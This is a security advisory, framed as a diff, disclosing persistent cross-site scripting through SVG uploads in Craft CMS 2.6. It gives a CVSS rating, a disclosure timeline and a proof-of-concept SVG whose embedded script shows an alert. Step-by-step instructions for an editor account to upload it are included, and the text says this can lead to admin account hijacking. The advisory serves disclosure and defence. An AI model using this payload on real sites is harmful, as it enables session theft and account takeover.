@@ -1,0 +1,99 @@
+# Exploit Title: Craft CMS 2.6 - Cross-Site Scripting/Unrestricted File Upload
+# Date: 2017-06-08
+# Exploit Author: Ahsan Tahir
+# Vendor Homepage: https://craftcms.com
+# Software Link: http://download.craftcdn.com/craft/2.6/2.6.2981/Craft-2.6.2981.zip
+# Version: 2.6
+# Tested on: [Kali Linux 2.0 | Windows 8.1]
+# Email: mrahsan1337@gmail.com
+# Contact: https://twitter.com/AhsanTahirAT
+
+Release Date:
+=============
+2017-06-08
+
+
+Product & Service Introduction:
+===============================
+Craft is a content-first CMS that aims to make life enjoyable for developers and content managers alike.
+
+
+Abstract Advisory Information:
+==============================
+Ahsan Tahir, an independent security researcher discovered a Persistent Cross-Site Scripting Vulnerability through Unrestricted File Upload of SVG file in Craft CMS (v2.6)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2017-06-08: Found the vulnerability.
+2017-06-08: Reported to vendor.
+2017-06-08: Published.
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Technical Details & Description:
+================================
+The security risk of the xss vulnerability is estimated as medium with a common vulnerability scoring system count of 3.6. 
+Exploitation of the persistent xss web vulnerability requires a limited editor user account with low privileged (only editing news) and only low user interaction.
+
+If attacker upload any file that can use for XSS (HTML, SWF, PHP etc..) it will not accept to uplaod as image. But for images it will stay the same. So if attacker upload SVG with JS content it will work fine and execute JS!
+
+The "Content-Type: image/svg+xml; charset=us-ascii" header will make this XSS attack work. 
+
+Successful exploitation of the XSS vulnerability results in persistent phishing attacks, session hijacking, persistent external redirect to malicious sources and persistent manipulation of affected or connected web module context.
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation vulnerability can be exploited by a low prviledged user/editor with privileges, only for editing news. After successful exploitation, this attack can be used by editor to hijack admin account!
+
+For security demonstraton or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+Payload (Exploitation): 
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert(document.domain);
+   </script>
+</svg>
+
+
+[+] Manual steps to reproduce ..
+1. Login with the editor account (only privilege to edit news) in Craft CMS
+2. Go to 'add news' option: https://localhost/admin/entries/news/new
+3. Put random values in title
+4. In your attacker machine, create a file named 'xss.svg' (without quotes) and inject the payload in the file: 
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert(document.domain);
+   </script>
+</svg>
+4. Upload the xss.svg file in featured image option in Craft CMS
+5. Click on Save
+6. Now go to: https://localhost/s/assets/site/xss.svg
+7. XSS payload execution occurs and alert pop-up with domain name
+
+
+Credits & Authors:
+==================
+Ahsan Tahir - [https://twitter.com/AhsanTahirAT]
